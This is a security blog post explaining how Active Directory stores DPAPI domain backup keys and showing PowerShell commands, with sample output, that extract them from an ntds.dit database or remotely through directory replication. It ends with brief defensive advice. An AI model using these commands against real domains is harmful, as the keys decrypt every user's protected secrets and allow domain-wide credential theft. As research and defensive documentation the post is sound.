---
ref: dpapi-backup-keys
title: 'Retrieving DPAPI Backup Keys from&nbsp;Active Directory'
date: 2015-10-26T22:51:00+00:00
layout: post
lang: en
image: /assets/images/backupkeys_storage.png
permalink: /en/retrieving-dpapi-backup-keys-from-active-directory/
tags:
    - 'Active Directory'
    - DPAPI
    - PowerShell
    - Security
---

The Data Protection API (DPAPI) is&nbsp;used by&nbsp;several components of&nbsp;Windows to&nbsp;securely store passwords, encryption keys and&nbsp;other sensitive data. When&nbsp;DPAPI is&nbsp;used in&nbsp;an&nbsp;Active Directory domain environment, a&nbsp;copy of&nbsp;user’s master key is&nbsp;encrypted with&nbsp;a&nbsp;so-called DPAPI Domain Backup Key that&nbsp;is&nbsp;known to&nbsp;all domain controllers. Windows Server 2000 DCs use a&nbsp;symmetric key and&nbsp;newer systems use a&nbsp;public/private key pair. If&nbsp;the&nbsp;user password is&nbsp;reset and&nbsp;the&nbsp;original master key is&nbsp;rendered inaccessible to&nbsp;the&nbsp;user, the&nbsp;user’s access to&nbsp;the&nbsp;master key is&nbsp;automatically restored using the&nbsp;backup key.

<!--more-->

## The&nbsp;Mimikatz Method

Benjamin Delpy has already found a&nbsp;way to&nbsp;extract these backup keys from&nbsp;the&nbsp;LSASS of&nbsp;domain controllers and&nbsp;it&nbsp;even&nbsp;works remotely:

![Mimikatz DPAPI Backup Keys](../../assets/images/mimikatz_backupkeys.png)

## Key Storage

I have taken Benjamin’s research one step further and&nbsp;I&nbsp;can now&nbsp;extract these keys directly from&nbsp;the&nbsp;Active Directory database, where&nbsp;they are&nbsp;physically stored:

![Backup Key Storage](../../assets/images/backupkeys_storage.png)

The keys are&nbsp;stored in&nbsp;the&nbsp;**currentValue** attribute of&nbsp;objects whose names begin with&nbsp;**BCKUPKEY** and&nbsp;are&nbsp;of&nbsp;class **secret**. The&nbsp;**BCKUPKEY_PREFERRED Secret** and&nbsp;**BCKUPKEY_P Secret** objects actually only contain GUIDs of&nbsp;objects that&nbsp;hold the&nbsp;current modern and&nbsp;legacy keys, respectively. Furthermore, the&nbsp;currentValue attribute is&nbsp;encrypted using BootKey (aka SysKey) and&nbsp;is&nbsp;never sent through LDAP.

## The&nbsp;Database Dump Method

The **Get-BootKey**, **Get-ADDBBackupKey** and&nbsp;**Save-DPAPIBlob** cmdlets from&nbsp;my [DSInternals PowerShell Module](/en/projects/) can be&nbsp;used to&nbsp;retrieve the&nbsp;DPAPI Domain Backup Keys from&nbsp;ntds.dit files:

```powershell
# We need to get the BootKey from the SYSTEM registry hive first:
Get-BootKey -SystemHiveFilePath 'C:\IFM\registry\SYSTEM'

<#
Output:

41e34661faa0d182182f6ddf0f0ca0d1

#>

# Now we can decrypt the DPAPI backup keys from the database:
Get-ADDBBackupKey -DBPath 'C:\IFM\Active Directory\ntds.dit' `
                  -BootKey 41e34661faa0d182182f6ddf0f0ca0d1 |
    Format-List

<#
Output:

Type : LegacyKey
DistinguishedName : CN=BCKUPKEY_7882b20e-96ef-4ce5-a2b9-3efdccbbce28 Secret,CN=System,DC=Adatum,DC=com
RawKeyData : {77, 138, 250, 6...}
KeyId : 7882b20e-96ef-4ce5-a2b9-3efdccbbce28

Type : PreferredLegacyKeyPointer
DistinguishedName : CN=BCKUPKEY_P Secret,CN=System,DC=Adatum,DC=com
RawKeyData : {14, 178, 130, 120...}
KeyId : 7882b20e-96ef-4ce5-a2b9-3efdccbbce28

Type : RSAKey
DistinguishedName : CN=BCKUPKEY_b1c56a3e-ddf7-41dd-a5f3-44a2ed27a96d Secret,CN=System,DC=Adatum,DC=com
RawKeyData : {48, 130, 9, 186...}
KeyId : b1c56a3e-ddf7-41dd-a5f3-44a2ed27a96d

Type : PreferredRSAKeyPointer
DistinguishedName : CN=BCKUPKEY_PREFERRED Secret,CN=System,DC=Adatum,DC=com
RawKeyData : {62, 106, 197, 177...}
KeyId : b1c56a3e-ddf7-41dd-a5f3-44a2ed27a96d

#>

# In most cases, we just want to export these keys to the file system:
Get-ADDBBackupKey -DBPath 'C:\IFM\Active Directory\ntds.dit' `
                  -BootKey 41e34661faa0d182182f6ddf0f0ca0d1 |
    Save-DPAPIBlob -DirectoryPath .\Keys

# New files should have been created in the Keys directory:

(dir .\Keys).Name

<#
Output:

ntds_capi_b1c56a3e-ddf7-41dd-a5f3-44a2ed27a96d.pfx
ntds_legacy_7882b20e-96ef-4ce5-a2b9-3efdccbbce28.key

#>
```

Note that&nbsp;mimikatz would name these files similarly.

## The&nbsp;DRSR Method

The same result can be&nbsp;achieved by&nbsp;communicating with&nbsp;the&nbsp;Directory Replication Service using the&nbsp;**Get-ADReplBackupKey** cmdlet:

```powershell
Get-ADReplBackupKey -Domain 'Adatum.com' -Server LON-DC1 |
    Save-DPAPIBlob -DirectoryPath .\Keys
```

## Defense

I am already starting to&nbsp;repeat myself:

- Restrict access to&nbsp;domain controller backups.
- Be&nbsp;cautious when&nbsp;delegating the&nbsp;*Replicating Directory Changes All* right.
